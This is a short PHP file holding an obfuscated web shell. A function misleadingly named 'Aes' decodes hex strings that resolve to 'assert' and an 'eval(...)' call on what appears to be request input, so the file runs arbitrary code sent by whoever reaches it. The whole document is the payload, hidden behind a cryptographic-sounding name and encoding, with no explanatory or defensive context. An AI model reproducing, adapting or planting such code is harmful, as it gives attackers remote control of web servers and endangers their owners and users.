<?php  
function Aes($str,$key)  
{  
$t="";  
for($i=0; $i<strlen($str); $i=$i+2)  
{  
    $k=(($i+2)/2)%strlen($key);  
    $p=substr($key, $k,1);  
    if(is_numeric(substr($str, $i,1)))  
    {  
        $t=$t.chr(hexdec(substr($str, $i,2))-$p);  
    }  
    else  
    {  
        $t=$t.chr(hexdec(substr($str, $i,4)));  
        $i=$i+2;  
    }  
}  
return($t);  
}  
  
(@$_=Aes('6A767C687B77','39')).@$_(Aes('6776666E286763736A38346466656871646A2A2464524F58565B2C7C302C5F292E','520'));  
?>  